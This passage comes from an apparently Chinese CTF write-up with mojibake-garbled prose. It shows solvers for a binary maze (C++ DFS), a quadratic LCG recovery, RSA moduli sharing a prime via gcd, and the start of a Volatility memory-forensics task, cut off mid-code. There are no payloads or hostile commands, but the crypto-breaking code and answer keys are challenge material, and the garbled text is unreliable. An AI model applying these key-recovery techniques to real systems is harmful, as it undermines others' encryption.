011111010111010101011101010111010101110111111111001010000000100000000010000010100010101000101010100000101000101000101010100010001010000010101010101010010101011111111101111111110101110101011101010101111101011101011111111111111111010111110101010101010100000010000010100000101010101010100000100000100010000010100000101010101000000000000000001000100000001001111111111101110111010101010101111101111101110111110101111101010101011111111111011111011101111111010000100010101010001010000000100000100010100000101010000010101010101000100000100000100000100010100010000101011101010111010111111101111101011101111101010111011101010101010111111101111111111101110101110111001000001000001000101010000010100000101010100000101000001010100000000010100000101000000010001010000010011111111101111101010111110101111101010101111101011111010101111101111101111101011111110111010111110100100010100000100000001000000010000000000000000010100000001010000000001010100000101000000000000010000001011101011111110111111111110101010111111111010101111111010111110111110101111101011111110111110101010010001000101010101010100000100010101000101000100010101000001000001000100010000000000000001000000010100101111101010101010101111101111111111101011111110101011101011101010111110111111111011111011111010111001000100000001000101000000010001010000000101000000000100010000010000010000000000000100000100000101000010111010101111101011111110111010111110101011111111101111111111111011111111111110111111111110101111100100000101000100000100010001000001010001000100000101010101010101000001010101010001000000000001010000001011111111111111101110101111111010111010101111101010101010101011111010101010111111111011111111111110010000010101010101010000000101000001000101000000000000000000000101010000000000010100000100010001010000101011101010101010111110111011101111111111111110101010101011101010111111111110101111101110111010111000010001000100010101010001010101000101010100000001010101010100000000000101010100010100010001000001010011111110111110101010111010101010111010101111111110111010111111101111101010101110101111111011101110100000000100010100010000000100000101010100010101000001000101000000010000000101010001010101000000000001001111111110101011111011101111101010101011101011111111101111101011111011101010111010101011111011101010000000010001010001000100010100000001010101010101000100010000010100000100000001000101010100000001010000111011111010101111111110101011101110101010101011101011111111111111101010111011101010101110101011111000010001000000000101010000000100000101010100000100000100010101010000010101000100000000010001010100000011111111111110111010111110101110111010101011111111111110101010111011111111101110101010111111101111100000010101010100010101000001010000010000010001010001010000000100000100010100000001010100010000010000001111101010101110101011111010101110101111111010111010111111101111111110101111101110111110101010111110000001000000010100010100000101010000000101010001000101000100010001010000000100000101000000010101000100111111111011101110101111111111111111101010101111101011101110111010101010101110101011101010111111101001010101000001000000010001010101000100010101010101000000000000000000010101000001010100010101000000000010101011111011111011111010101011101110101010101011111010111111111110101010101010111111111111101011100100000100000100000101000001000100000000000101010101000101000101000001010101010101000000010000010100001011111111101111101011111011101111101111101010101011111111101011111111111011111111111110111111111110010000010100000000000101010101010000010001010001010101010000000001010101000100010100010001000101000000101011101111111111101010101010111111111010101110101010111111111010101011111110101110101111101011111000010001010001010000000000000101010100000000000101000101010001000001010101010000010001000100000100000011111110111010111111111111101010101110101111101010111010111011111010101010111110111010101010101110100001010101010001010101000001000100010001010000010000010101010000000000000001010000000001000101000001001110101010111010101011111011101110111111111110101111101010111111111110111110101010101011111111111110010100010000000000010101000000000001010101010100000101010001000001000000010100010101010001000100000100101011111111101010101011111111111010101010101110111010111011111011111011101111111111101011101011101001010001000100010100000101010100000101000100010001010101000001010101000001010001010000010100000100000010101111101011111110111010101111101011101110101110101011111010101011111010111010111111111111111110100100000100000100010000010000010000010000010101000100010101000000010100000101010000010001010101000001001011111111111110111110111011111110111110101010111110101011111011101111101010111110111010101011111110010101010101010001010000010101010001000000010101010101000100000001010000000001010101000100000101010100101010101010111010111110101010111011111110101010101010111111101110111110101110101011101111101010101000000101010100000001010000000001000100000001010100000000010101000100000001000101000000000100000000000011111010101111111010101010101111101111101010101111111011101010111111111111101011111111101111101011100101000100010100000100010101000100000000010000010101000001000000010100010100000101000100010100010100001010111011101111101111111110111111101111111110101011101111111011101110101110111011101110101111111110010000000001010000010101010000010100010000000101010100000101000000010000010001010100010001010101010000101111111110111110101010111110101110111111101010101110111010111111111110111010101010111010101010111000010100010101000000010101010000000001000000000000010000010100000001000001010001000100000000010101010011101011101011111010101010111111111111111111101011111110101110111111111010101111111111111011101010100001000000000100000100010001010100010100000000010001010100010100010101000101000101010000000001000000001110111111111111111110101110101110101111111011111010101110101011101011101010111010111111111011111110000000000000010001010101000101010100010001000001000000000000000000010000010100010001000101000101010100111111111111111010101011101010101110111011101011101110101010111111111110101011111011101011101010101000010100000101010100000100010101010101000000010100010001010100010101010000010101000101010101000101010011101011111010101010101011101010101011111111111111111111111110101010111110101011101010101011101010100001000001010100000101000001010001010101010101010001010101010000010101010000000101000001000101000001001110111110101111111111111010111010101010101010111010101010111110101010111110111011111010111011111010000101010100010000000100010101000001000001010001000000010101010100010101010000010101000100010101010100111010101011111111101110101011111011111010101111111110101010101110101010111011101011101011101010101200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>ç„¶åå†™ä¸ªæ·±åº¦ä¼˜å…ˆçš„è„šæœ¬å°±å¯ä»¥è§£å‡ºæ¥äº†ã€‚ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include&lt;iostream&gt;#include&lt;cstdio&gt;#include&lt;cstring&gt;using namespace std;int x1[]&#x3D;&#123;1,0,-1,0&#125;,    y1[]&#x3D;&#123;0,1,0,-1&#125;;char w[] &#x3D; &#123;&#39;s&#39;,&#39;d&#39;,&#39;w&#39;,&#39;a&#39;&#125;;char f[103][103];char leng[500];int flag &#x3D; 0;bool vis[103][103];int n&#x3D;101;void dfs(int x,int y,int len)&#123;        vis[x][y] &#x3D; 1;        if(flag &#x3D;&#x3D; 1)        return;        if(f[x][y] &#x3D;&#x3D; &#39;2&#39;)        &#123;                for(int j &#x3D; 0;j&lt;&#x3D;len;++j)                cout&lt;&lt;leng[j];                flag &#x3D; 1;                cout&lt;&lt;endl;                return;         &#125;        for(int i &#x3D; 0;i&lt;4;++i)        &#123;                int nx &#x3D; x+x1[i];                int ny &#x3D; y+y1[i];                if(nx&lt;0||ny&lt;0||nx&gt;&#x3D;n||ny&gt;&#x3D;n||vis[nx][ny] &#x3D;&#x3D; 1)                continue;                if(f[nx][ny] &#x3D;&#x3D; &#39;0&#39;)                continue;                leng[len] &#x3D; w[i];                dfs(nx,ny,len+1);                vis[nx][ny] &#x3D; 0;        &#125; &#125;int main() &#123;                for(int i &#x3D; 0;i&lt;n;++i)         for(int j &#x3D; 0;j&lt;n;++j)                 cin&gt;&gt;f[i][j];        dfs(1,0,0); &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>md5ä¹‹åå°±æ˜¯flag</p><h3 id="å¯†ç 1-LCG"><a class="header-anchor" href="#å¯†ç 1-LCG">Â¶</a>å¯†ç 1 LCG</h3><p>è¿™ä¸ªé¢˜çœ‹èµ°çœ¼ï¼Œä¹Ÿæ˜¯é¢˜ç›®æœ‰ç‚¹é—®é¢˜ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>flag <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">LCG</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>a <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>b <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>c <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>n <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>seed <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>                <span class="token keyword">def</span> <span class="token function">next</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>seed <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>a <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">+</span> self<span class="token punctuation">.</span>b <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">+</span> self<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>n            <span class="token keyword">return</span> self<span class="token punctuation">.</span>seed                 <span class="token keyword">def</span> <span class="token function">output</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"b = &#123;&#125;\nn = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>b<span class="token punctuation">,</span> self<span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"seed = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>seed<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s1 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s2 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        lcg <span class="token operator">=</span> LCG<span class="token punctuation">(</span><span class="token punctuation">)</span>            lcg<span class="token punctuation">.</span>output<span class="token punctuation">(</span><span class="token punctuation">)</span>            c1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>flag <span class="token operator">*</span> lcg<span class="token punctuation">.</span>a <span class="token operator">+</span> lcg<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> lcg<span class="token punctuation">.</span>n<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span>            c2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c1 <span class="token operator">*</span> lcg<span class="token punctuation">.</span>a <span class="token operator">+</span> lcg<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> lcg<span class="token punctuation">.</span>n<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c1 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c2 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token triple-quoted-string string">'''            b = 3831416627            n = 2273386207            seed = 2403188683            s1 = 260742417            s2 = 447908860            c1 = 17275            c2 = 28951            '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>é€šè¿‡seedï¼Œs1,s2å…ˆç®—å‡ºlcgçš„aå’Œc<br>è¿™é‡Œé€šè¿‡c1,c2çš„è®¡ç®—æ˜¯æœ‰äº›æ­§ä¹‰çš„ï¼Œæœ€åçš„æ­£è§£æ˜¯c1æ˜¯æ²¡æœ‰å³ç§»å¸¦å…¥c2çš„è¿ç®—çš„ï¼Œä¸ç„¶æŒ‰ç…§åŸæ¥ä»£ç æ˜¯æ±‚ä¸å‡ºflagçš„ï¼Œå½“ç„¶è¿™ä¹Ÿå¯¼è‡´äº†ä¸€æ³¢äººè§£ä¸å‡ºæ¥,è¿™é‡Œè¿˜éœ€è¦æ³¨æ„æœ€åçš„flagæ˜¯32ä½ï¼Œflagéœ€è¦åŠ ä¸ªn</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2b <span class="token operator">=</span> <span class="token number">3831416627</span>n <span class="token operator">=</span> <span class="token number">2273386207</span>seed <span class="token operator">=</span> <span class="token number">2403188683</span>s1 <span class="token operator">=</span> <span class="token number">260742417</span>s2 <span class="token operator">=</span> <span class="token number">447908860</span>c1 <span class="token operator">=</span> <span class="token number">17275</span>c2 <span class="token operator">=</span> <span class="token number">28951</span>a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s2<span class="token operator">-</span>s1<span class="token punctuation">)</span><span class="token operator">-</span>b<span class="token operator">*</span><span class="token punctuation">(</span>s1<span class="token operator">-</span>seed<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>seed<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>nc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span>a<span class="token operator">*</span>s1<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">-</span> b<span class="token operator">*</span>s1 <span class="token operator">+</span> s2<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c11 <span class="token operator">=</span> <span class="token punctuation">(</span>c1<span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> i    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c11<span class="token operator">*</span>a<span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span> <span class="token operator">==</span> c2<span class="token punctuation">:</span>        flag <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c11<span class="token operator">-</span>c<span class="token punctuation">)</span><span class="token operator">*</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>a<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>æ­£ç¡®çš„é¢˜ç›®</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>flag <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">LCG</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>a <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>b <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>c <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>n <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>seed <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>                <span class="token keyword">def</span> <span class="token function">next</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>seed <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>a <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">+</span> self<span class="token punctuation">.</span>b <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">+</span> self<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>n            <span class="token keyword">return</span> self<span class="token punctuation">.</span>seed                 <span class="token keyword">def</span> <span class="token function">output</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"b = &#123;&#125;\nn = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>b<span class="token punctuation">,</span> self<span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"seed = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>seed<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s1 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s2 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        lcg <span class="token operator">=</span> LCG<span class="token punctuation">(</span><span class="token punctuation">)</span>            lcg<span class="token punctuation">.</span>output<span class="token punctuation">(</span><span class="token punctuation">)</span>            c1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>flag <span class="token operator">*</span> lcg<span class="token punctuation">.</span>a <span class="token operator">+</span> lcg<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> lcg<span class="token punctuation">.</span>n<span class="token punctuation">)</span>            c2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c1 <span class="token operator">*</span> lcg<span class="token punctuation">.</span>a <span class="token operator">+</span> lcg<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> lcg<span class="token punctuation">.</span>n<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c1 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c1<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c2 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token triple-quoted-string string">'''            b = 3831416627            n = 2273386207            seed = 2403188683            s1 = 260742417            s2 = 447908860            c1 = 17275            c2 = 28951            '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="å¯†ç 2"><a class="header-anchor" href="#å¯†ç 2">Â¶</a>å¯†ç 2</h3><p>å¾ˆç®€å•çš„è´¨å› æ•°gcdæ±‚å› æ•°</p><figure><div class="code-wrapper"><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">import gmpy2from Crypto.Util.number import *n1&#x3D; 12671827609071157026977398418260127577729239910356059636353714138256023623770344437013038456629652805253619484243190436122472172086809006270535958920503788271745182898308583012315393657937467583278528574109842696210193482837553369816110424840884683667932711439417044144625891738594098963618068866281205254024287936360981926173192169919836661589685119695804443529730259703940744061684219737502099455504322939948562185702662485642366411258841082322583213825076942399375712892608077960687636100621655314604756871227708407963698548718981737143081639214928707030543449473132959887760171345393471397998907576088643495456531e1&#x3D; 65537c1&#x3D; 5268497051283009363591890965286255308367378505062739645805302950184343652292967525985407935922935972883557494557593439711003227737116083417992112594428400382187113609935251268634230537282408994938066541612999550555591607744019286392765549844400176442415480559773688439693874264657925123598756193286897112566420847480601040372338338442932524410598834393630019038536173336696498743879160879377504894526001205060753543289059104874467150194596404490638065573974570258671195173327475871936431769234701590572816592485898568463143587137721883610069616008902637316459660001435171054741347142470208082183171637233299493273737n2&#x3D; 18090800828995898324812976370950614944724424095669490324214928162454640462382724191043785592350299626782376411935499259428970532102686361824967300649916495702138825182857737210486173137998811993244590794690070307872074705348982970060304389842338043432383690934814892283936018142382990267868341375956549210694354065317328612440672169232803362481090661368782599819926970968509827001203936933692777821117679448168400620234261164018167404541446201828349880887526076468982840569645753428057937172715073817332736878737709704495317549386111938639861221307607948775421897063976457107356574428602380790814162110473018856344871e2&#x3D; 4097c2&#x3D; 2326267610355516153575986453727161366266816656017644910981028690283132055217271939475840618294311986463011398892570340626131158223217558335139831985973737748812636360601010312490160903427322848411507157238373313053959092326875136396134997877757316339153327290508806645882428114647041522287934007579220769189583249469879165078254248922442084985860374461188259818592181294686890335242981199427715392978546977718475462727987012437677290341463732660152302257234030751774759466703002189003437204934438026047163828083902584763527752033035438078609950665211243112982373167722458975172667665849715372158378299319548194854914n3&#x3D; 14016899139767071357961567514373780608355222973882916699129907806456201886114368147540489514960479836424236595826190295819765979835270500889626994048655508134450908075698567925938340322498944878806273261377551132596295484579752118097281084614987064680928168918147910522922020462762688924459558896249968804885885853885632349539590507675397376494346489972596290270168847103345561743327300964196811506510943971437325302822974593782292850499524055338033832053610217461760698628614971171144300450574522839157187874548994036357212297166759231255765155759405207408315314182166142015547345744054533749334516820850300569790673e3&#x3D; 1048577c3&#x3D; 1507157402302225700443994264641838312753363380677759942918832857396550216927941389943122383728949792984913155517202501504817319345830153748955731880333992875210194306712098593166605310784068299411946792264365247471197716329666415403718297430110977954951479772565341847358286252098930408452594561104228639615640815799731581302607522977457874347224189202268831547055389518214072278766864028489294466057175201908756749666131546163372443691718757198229262989973810951064160488114367967684657242385568733678188829354802025582496625272334309487028498614869964712744826603931510547381997149345221530469380732265014466170524p &#x3D; gmpy2.gcd(n1,n2)q1 &#x3D; n1&#x2F;&#x2F;pd1 &#x3D; gmpy2.invert(e1,(q1-1)*(p-1))print(long_to_bytes(pow(c1,d1,n1)))q2 &#x3D; n2&#x2F;&#x2F;pd2 &#x3D; gmpy2.invert(e2,(q2-1)*(p-1))print(long_to_bytes(pow(c2,d2,n2)))p &#x3D; gmpy2.gcd(n2,n3)q1 &#x3D; n3&#x2F;&#x2F;pd1 &#x3D; gmpy2.invert(e3,(q1-1)*(p-1))print(long_to_bytes(pow(c3,d1,n3)))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="misc1-å–è¯"><a class="header-anchor" href="#misc1-å–è¯">Â¶</a>misc1 å–è¯</h3><p>è¿™ä¸ªmiscæˆ‘åšçš„æœ‰ç‚¹ç‹—è¡€å’Œè„‘æ´ã€‚<br>é¦–å…ˆæ‹¿åˆ°ä¹‹åï¼Œå·¥å…·æŸ¥çœ‹ä¸€ä¸‹è¿›ç¨‹ï¼Œå‘ç°æ˜¯notepadå’Œç”»å›¾è½¯ä»¶ï¼ˆè¿™é‡Œæˆ‘å°±å¿½ç•¥äº†è¿˜æœ‰ä¸€ä¸ªå†™çš„ç¨‹åºwordpadï¼‰</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d8fe2b750f393e8d1c442bc5fc7800d3517ffdd5.png" alt="å›¾ç‰‡.png"></p><p>ç„¶åæŠŠnotepadä¸œè¥¿dumpå‡ºæ¥</p><figure><div class="code-wrapper"><pre class="line-numbers language-Plain" data-language="Plain"><code class="language-Plain">Volatility Foundation Volatility Framework 2.6Process: 236Text:?Text:dText:Text:?Text:??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????Process: 372Text:?Text:dText:Text:?Text:f &#x3D; open(&#39;.&#x2F;flag.zip&#39;, &#39;rb&#39;).read()new &#x3D; open(&#39;.&#x2F;fffflllaag.dat&#39;, &#39;ab&#39;)letter &#x3D; &#39;&#39;secret &#x3D; int(letter,16)print(secret)for i in f:    n &#x3D; int(i) ^ secret    new.write(int(n).to_bytes(1, &#39;big&#39;))Process: 132Text:?Text:dText:Text:?Text:According to Homer&#39;s epic, the hero Achilles is the precious son of the mortal Polus and the beautiful fairy Thetis.It is said that her mother Tethys carried him upside down into the Styx river when he was just born, so that he could be invulnerable.Unfortunately, due to the rapid flow of the Ming River, his mother didn&#39;t dare to let go of his heel.The heel held by his mother was accidentally exposed outside the water, so the heel was the most vulnerable place, leaving the only &quot;dead hole&quot; in his body, so he buried the disaster.When he grew up, Achilles fought bravely. When he went to attack the city of Troy (the story of Trojan horse slaughtering the city), the brave Achilles singled out the Trojan general Hector, killed him and dragged his body to demonstrate.But later, after conquering Troy, Achilles was attacked by an arrow by Hector&#39;s brother-in-law Paris and hit his ankle - the hero fell to the ground and died at the moment of shaking.ankle, ankle, I love ankle.The password is ??k1eAn???Process: 2060Text:?Text:dText:Text:?Text:???????????????????????????????XOR?EOR????????????????????????????????letter?????????????????????????<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>å¾—åˆ°æœ‰æ•ˆçš„ä¿¡æ¯</p><figure><div class="code-wrapper"><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">f &#x3D; 